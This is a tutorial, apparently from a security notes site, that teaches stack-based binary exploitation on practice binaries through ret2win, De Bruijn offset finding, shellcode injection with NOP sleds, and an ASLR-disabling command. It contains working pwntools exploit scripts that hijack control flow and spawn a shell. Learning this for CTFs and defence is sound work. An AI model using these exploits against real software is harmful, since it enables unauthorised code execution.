# Binary Exploitation - Stack

> https://ir0nstone.gitbook.io/notes/

## Introduction

> An Introduction to binary exploitation

**Binary Exploitation** is about finding vulnerabilities in programs and utilizing them to do what you wish. Sometimes this can result in an authentication bypass or the leaking of classified information, but occasionally (if you're lucky) it can also result in Remote Code Execution (RCE). The most basic forms of binary exploitation occur on the **stack**, a region of memory that stores temporary variables created by functions in code.

When a new function is called, a memory address in the **calling** function is pushed to the stack - this way, the program knows where to return to once the called function finishes execution. Let's look at a basic binary to show this.

[introduction.zip](assets/introduction.zip)

### Analysis

The binary has two files - `source.c` and `vuln`; the latter is an `ELF` file, which is the executable format for Linux (it is recommended to follow along with this with a Virtual Machine of your own, preferably Linux).

We're gonna use a tool called `radare2` to analyze the behavior of the binary when functions are called.

```bash
$ r2 -d -A vuln
```

The `-d` runs it while the `-A` performs the analysis. We can disassemble the `main` with

```bash
s main; pdf
```

`s main` seeks (moves) to main, while `pdf` stands for **P**rint **D**isassembly **F**unction (literally just disassembles it).

```bash
0x080491ab      55             push ebp
0x080491ac      89e5           mov ebp, esp
0x080491ae      83e4f0         and esp, 0xfffffff0
0x080491b1      e80d000000     call sym.__x86.get_pc_thunk.ax
0x080491b6      054a2e0000     add eax, 0x2e4a
0x080491bb      e8b2ffffff     call sym.unsafe
0x080491c0      90             nop
0x080491c1      c9             leave
0x080491c2      c3             ret
```

The call to `unsafe` is at `0x080491bb`, so let's break there.

```bash
db 0x080491bb
```

`db` stands for **d**ebug **b**reakpoint and just sets a breakpoint. A breakpoint is simply somewhere that pauses the program for you to run other commands when reached. Now we run `dc` for **d**ebug **c**ontinue; this just carries on running the file.

It should break before `unsafe` is called; let's analyze the top of the stack now:

```bash
[0x08049172]> pxw @ esp
0xff984af0 0xf7efe000         [...]
```

The first address, `0xff984af0`, is the position; the `0xf7efe000` is the value. Let's move one more instruction with the `ds`, **d**ebug **s**tep, and check the stack again.

```bash
[0x08049172]> pxw @ esp
0xff984aec  0x080491c0 0xf7efe000
```

Huh, something's been pushed onto the stack - the value `0x080491c0`. This looks like it's in the binary - but where?

```bash
[...]
0x080491b6      054a2e0000     add eax, 0x2e4a
0x080491bb      e8b2ffffff     call sym.unsafe
0x080491c0      90             nop
[...]
```

Look at that - it's the instruction *after* the call to `unsafe`. Why? This is how the program knows *where to return to after* `*unsafe()*` *has finished*.

### Weaknesses

But as we're interested in binary exploitation, let's see how we can possibly break this. First, let's disassemble `unsafe` and break on the `ret` instruction; `ret` is the equivalent of `pop eip`, which will get the saved return pointer we just analyzed on the stack into the `eip` register. Then let's continue and spam a bunch of characters into the input and see how that could affect it.

```bash
[0x08049172]> db 0x080491aa
[0x08049172]> dc
Overflow me
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Now let's read the value at the location the return pointer was at previously, which as we saw was `0xff984aec`.

```bash
[0x080491aa]> pxw @ 0xff984aec
0xff984aec  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
```

Huh?

It's quite simple - we inputted *more data than the program expected*, which resulted in us overwriting more of the stack than the developer expected. The saved return pointer is *also* on the stack, meaning we managed to overwrite it. As a result, on the `ret`, the value popped into `eip` won't be in the previous function but rather `0x41414141`. Let's check with `ds`.

```bash
[0x080491aa]> ds
[0x41414141]>
```

And look at the new prompt - `0x41414141`. Let's run `dr eip` to make sure that's the value in `eip`:

```bash
[0x41414141]> dr eip
0x41414141
```

Yup, it is! We've successfully hijacked the program execution! Let's see if it crashes when we let it run with `dc`.

```bash
[0x41414141]> dc
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x41414141 code=1 ret=0
```

`radare2` is very useful and prints out the address that causes it to crash. If you cause the program to crash outside of a debugger, it will usually say `Segmentation Fault`, which *could* mean a variety of things, but usually that you have overwritten EIP.

> Of course, you can prevent people from writing more characters than expected when making your program, usually using *other* C functions such as `fgets()`; `gets()` is **intrinsically unsafe** because it *doesn't check the length of the input*, meaning that the presence of `gets()` is **always** something you should check out in a program. It is **also** possible to give `fgets()` the wrong parameters, meaning it *still* takes in too many characters.

### Summary

When a function calls another function, it

- pushes a **return pointer** to the stack so the called function knows where to return
- when the called function finishes execution, it pops it off the stack again

Because this value is saved on the stack, just like our local variables, if we write *more* characters than the program expects, we can overwrite the value and redirect code execution to wherever we wish. Functions such as `fgets()` can prevent such easy overflow, but you should check how much is actually being read.

## ret2win

> The most basic binexp challenge

A **ret2win** is simply a binary where there is a `win()` function (or equivalent); once you successfully redirect execution there, you complete the challenge.

To carry this out, we have to leverage what we learned in the **introduction**, but in a *predictable manner* - we have to overwrite EIP, but to a specific value of our choice.

To do this, what do we need to know? Well, a couple of things:

- The padding *until* we begin to overwrite the return pointer (EIP)
- What value do we want to overwrite EIP to

When I say "overwrite EIP", I mean overwrite the saved return pointer that gets popped into EIP. The EIP register is not located on the stack, so it is not overwritten directly.

[ret2win.zip](assets/ret2win.zip)

### Finding the Padding

This can be found using simple trial and error; if we send a variable number of characters, we can use the `Segmentation Fault` message, in combination with radare2, to tell when we overwrote EIP. There is a better way to do it than simple brute force (we'll cover this in the next post), but it'll do for now.

> You may get a segmentation fault for reasons other than overwriting EIP; use a debugger to make sure the padding is correct.

We get an offset of 52 bytes.

### Finding the Address

Now we need to find the address of the `flag()` function in the binary. This is simple.

```bash
$ r2 -d -A vuln
$ afl
[...]
0x080491c3    1 43           sym.flag
[...]
```

> `afl` stands for **A**nalyse **F**unctions **L**ist

The `flag()` function is at `0x080491c3`.

### Using the Information

The final piece of the puzzle is to work out how we can send the address we want. If you think back to the introduction, the `A`s that we sent became `0x41` - which is the ASCII code of `A`. So the solution is simple - let's just find the characters with ASCII codes `0x08`, `0x04`, `0x91`, and `0xc3`.

This is a lot simpler than you might think because we can specify them in Python as hex:

```python
address = '\x08\x04\x91\xc3'
```

And that makes it much easier.

### Putting it Together

Now we know the padding and the value, let's exploit the binary! We can use [`pwntools`](https://github.com/Gallopsled/pwntools) to interface with the binary (check out the [pwntools posts](https://ir0nstone.gitbook.io/notes/other/pwntools) for a more in-depth look).

```python
from pwn import *        # This is how we import pwntools

p = process('./vuln')    # We're starting a new process

payload = 'A' * 52
payload += '\x08\x04\x91\xc3'

p.clean()                # Receive all the text

p.sendline(payload)

log.info(p.clean())      # Output the "Exploited!" string to know we succeeded
```

If you run this, there is one small problem: it won't work. Why? Let's check with a debugger. We'll put a `pause()` to give us time to attach `radare2` to the process.

```python
from pwn import *

p = process('./vuln')

payload = b'A' * 52
payload += '\x08\x04\x91\xc3'

log.info(p.clean())

pause()        # add this in

p.sendline(payload)

log.info(p.clean())
```

Now let's run the script with `python3 exploit.py` and then open up a new terminal window.

```bash
r2 -d -A $(pidof vuln)
```

By providing the PID of the process, radare2 hooks onto it. Let's break at the return of `unsafe()` and read the value of the return pointer.

```bash
[0x08049172]> db 0x080491aa
[0x08049172]> dc

<< press any button on the exploit terminal window >>

hit breakpoint at: 80491aa
[0x080491aa]> pxw @ esp
0xffdb0f7c  0xc3910408 [...]
[...]
```

`0xc3910408` - look familiar? It's the address we were trying to send over, except the bytes have been reversed, and the reason for this reversal is [endianness](https://en.wikipedia.org/wiki/Endianness). Big-endian systems store the **most significant byte** (the byte with the largest value) at the smallest memory address, and this is how we sent them. Little-endian does the opposite ([for a reason](https://softwareengineering.stackexchange.com/questions/95556/what-is-the-advantage-of-little-endian-format)), and most binaries you will come across are little-endian. As far as we're concerned, the byte is stored in *reverse order* in little-endian executables.

### Finding the Endianness

`radare2` comes with a nice tool called `rabin2` for binary analysis:

```bash
$ rabin2 -I vuln
[...]
endian   little
[...]
```

So our binary is **little-endian**.

### Accounting for Endianness

The fix is simple - reverse the address (you can also remove the `pause()`)

```python
payload += '\x08\x04\x91\xc3'[::-1]
```

If you run this now, it will work:

```bash
$ python3 tutorial.py 
[+] Starting local process './vuln': pid 2290
[*] Overflow me
[*] Exploited!!!!!
```

And wham, you've called the `flag()` function! Congrats!

### Pwntools and Endianness

Unsurprisingly, you're not the first person to have thought "Could they possibly make endianness simpler" - luckily, pwntools has a built-in `p32()` function ready for use!

```python
payload += '\x08\x04\x91\xc3'[::-1]
```

becomes

```python
payload += p32(0x080491c3)
```

Much simpler, right?

The only caveat is that it returns `bytes` rather than a string, so you have to make the padding a byte string:

```python
payload = b'A' * 52        # Notice the "b"
```

Otherwise, you will get a

```python
TypeError: can only concatenate str (not "bytes") to str
```

### Final Exploit

```python
from pwn import *            # This is how we import pwntools

p = process('./vuln')        # We're starting a new process

payload = b'A' * 52
payload += p32(0x080491c3)   # Use pwntools to pack it

log.info(p.clean())          # Receive all the text
p.sendline(payload)

log.info(p.clean())          # Output the "Exploited!" string to know we succeeded
```

## De Bruijn Sequences

> The better way to calculate offsets

De Bruijn sequences of order `n` is simply a sequence where no string of `n` characters is repeated. This makes finding the offset until EIP much simpler - we can just pass in a De Bruijn sequence, get the value within EIP and find the **one possible match** within the sequence to calculate the offset. Let's do this on the **ret2win** binary.

### Generating the Pattern

Again, `radare2` comes with a nice command-line tool (called `ragg2`) that can generate it for us. Let's create a sequence of length `100`.

```bash
$ ragg2 -P 100 -r
AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh
```

The `-P` specifies the length while `-r` tells it to show ascii bytes rather than hex pairs.

### Using the Pattern

Now we have the pattern, let's just input it in `radare2` when prompted for input, make it crash, and then calculate how far along the sequence the EIP is. Simples.

```bash
$ r2 -d -A vuln

[0xf7ede0b0]> dc
Overflow me
AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x41534141 code=1 ret=0
```

The address it crashes on is `0x41534141`; we can use `radare2`'s in-built `wopO` command to work out the offset.

```bash
[0x41534141]> wopO 0x41534141
52
```

Awesome - we get the correct value!

We can also be lazy and not copy the value.

```bash
[0x41534141]> wopO `dr eip`
52
```

The backticks mean the `dr eip` is calculated first before the `wopO` is run on the result of it.

## Shellcode

> Running your own code

In real exploits, it's not particularly likely that you will have a `win()` function lying around - shellcode is a way to run your **own** instructions, giving you the ability to run arbitrary commands on the system.

**Shellcode** is essentially **assembly instructions**, except we input them into the binary; once we input it, we overwrite the return pointer to hijack code execution and point at our own instructions!

> I promise you can trust me but you should never *ever* run shellcode without knowing what it does. Pwntools is safe and has almost all the shellcode you will ever need.

The reason shellcode is successful is that [Von Neumann architecture](https://en.wikipedia.org/wiki/Von_Neumann_architecture) (the architecture used in most computers today) does not differentiate between **data** and **instructions** - it doesn't matter where or what you tell it to run, it will attempt to run it.  Therefore, even though our input is data, the computer *doesn't know that* - and we can use that to our advantage.

[shellcode.zip](assets/shellcode.zip)

### Disabling ASLR

ASLR is a security technique, and while it is not specifically designed to combat shellcode, it involves randomizing certain aspects of memory (we will talk about it in much more detail later). This randomization can make shellcode exploits like the one we're about to do less reliable, so we'll be disabling it, for now, [using this](https://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization).

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

> Again, you should never run commands if you don't know what they do

### Finding the Buffer in Memory

Let's debug `vuln()` using `radare2` and work out where in memory the buffer starts; this is where we want to point the return pointer to.

```bash
$ r2 -d -A vuln

[0xf7fd40b0]> s sym.unsafe ; pdf
[...]
; var int32_t var_134h @ ebp-0x134
[...]
```

This value that gets printed out is a **local variable** - due to its size, it's fairly likely to be the buffer. Let's set a breakpoint just after `gets()` and find the exact address.

```bash
[0x08049172]> dc
Overflow me
<<Found me>>                    <== This was my input
hit breakpoint at: 80491a8
[0x080491a8]> px @ ebp - 0x134
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0xffffcfb4  3c3c 466f 756e 6420 6d65 3e3e 00d1 fcf7  <<Found me>>....

[...]
```

It appears to be at `0xffffcfd4`; if we run the binary multiple times, it should remain where it is (if it doesn't, make sure ASLR is disabled!).

### Finding the Padding

Now we need to calculate the padding until the return pointer. We'll use the De Bruijn sequence as explained in the previous blog post.

```bash
$ ragg2 -P 400 -r
<copy this>

$ r2 -d -A vuln
[0xf7fd40b0]> dc
Overflow me
<<paste here>>
[0x73424172]> wopO `dr eip`
312
```

The padding is 312 bytes.

### Putting it all together

In order for the shellcode to be correct, we're going to set the `context.binary` to our binary; this grabs stuff like the arch, OS, and bits and enables pwntools to provide us with working shellcode.

```python
from pwn import *

context.binary = ELF('./vuln')

p = process()
```

> We can use just `process()` because once the `context.binary` is set it is assumed to use that process

Now we can use pwntools' awesome shellcode functionality to make it *incredibly* simple.

```python
payload = asm(shellcraft.sh())          # The shellcode
payload = payload.ljust(312, b'A')      # Padding
payload += p32(0xffffcfb4)              # Address of the Shellcode
```

Yup, that's it. Now let's send it off and use `p.interactive()`, which enables us to communicate to the shell.

```python
log.info(p.clean())

p.sendline(payload)

p.interactive()
```

> If you're getting an `EOFError`, print out the shellcode and try to find it in memory - the stack address may be wrong

```bash
$ python3 exploit.py
[*] 'vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Starting local process 'vuln': pid 3606
[*] Overflow me
[*] Switching to interactive mode
$ whoami
ironstone
$ ls
exploit.py  source.c  vuln
```

And it works! Awesome.

### Final Exploit

```python
from pwn import *

context.binary = ELF('./vuln')

p = process()

payload = asm(shellcraft.sh())          # The shellcode
payload = payload.ljust(312, b'A')      # Padding
payload += p32(0xffffcfb4)              # Address of the Shellcode

log.info(p.clean())

p.sendline(payload)

p.interactive()
```

### Summary

- We injected shellcode, a series of assembly instructions, when prompted for input
- We then hijacked code execution by overwriting the saved return pointer on the stack and modified it to point to our shellcode
- Once the return pointer got popped into EIP, it pointed at our shellcode
- This caused the program to execute our instructions, giving us (in this case) a shell for arbitrary command execution

## NOPs

> More reliable shellcode exploits

NOP (no operation) instructions do exactly what they sound like *nothing*. This makes them very useful for shellcode exploits because all they will do is run the next instruction. If we pad our exploits on the left with NOPs and point EIP in the middle of them, it'll simply keep doing no instructions until it reaches our actual shellcode. This allows us a greater margin of error as a shift of a few bytes forward or backward won't really affect it, it'll just run a different number of NOP instructions - which have the same end result of running the shellcode. This padding with NOPs is often called a NOP slide or NOP sled since the EIP is essentially sliding down them.

In intel x86 assembly, NOP instructions are `\x90`.

> The NOP instruction actually used to stand for `XCHG EAX, EAX`, which does effectively nothing. You can read a bit more about it [on this StackOverflow question](https://stackoverflow.com/questions/25008772/whats-the-difference-between-the-x86-nop-and-fnop-instructions/25053039).

### Updating our Shellcode Exploit

We can make slight changes to our exploit to do two things:

- Add a large number of NOPs on the left
- Adjust our return pointer to point at the middle of the NOPs rather than the buffer start

> Make sure ASLR is still disabled. If you have to disable it again, you may have to readjust your previous exploit as the buffer location may be different.

```python
from pwn import *

context.binary = ELF('./vuln')

p = process()

payload = b'\x90' * 240                 # The NOPs
payload += asm(shellcraft.sh())         # The shellcode
payload = payload.ljust(312, b'A')      # Padding
payload += p32(0xffffcfb4 + 120)        # Address of the buffer + half nop length

log.info(p.clean())

p.sendline(payload)

p.interactive()
```

> It's probably worth mentioning that shellcode with NOPs is not failsafe; if you receive unexpected errors padding with NOPs but the shellcode worked before, try reducing the length of the nopsled as it may be tampering with other things on the stack

Note that NOPs are only `\x90` in certain architectures, and if you need others you can use pwntools:

```python
nop = asm(shellcraft.nop())
```

## 32- vs 64-bit

> The differences between the sizes

Everything we have done so far is applicable to 64-bit as well as 32-bit; the only thing you would need to change is switching out the `p32()` for `p64()` as the memory addresses are longer.

The real difference between the two, however, is the way you pass parameters to functions (which we'll be looking at much closer soon); in 32-bit, all parameters are pushed to the stack before the function is called. In 64-bit, however, the first 6 are stored in the registers RDI, RSI, RDX, RCX, R8, and R9 respectively as per the [calling convention](https://en.wikipedia.org/wiki/X86_calling_conventions). Note that different Operating Systems also have different calling conventions.
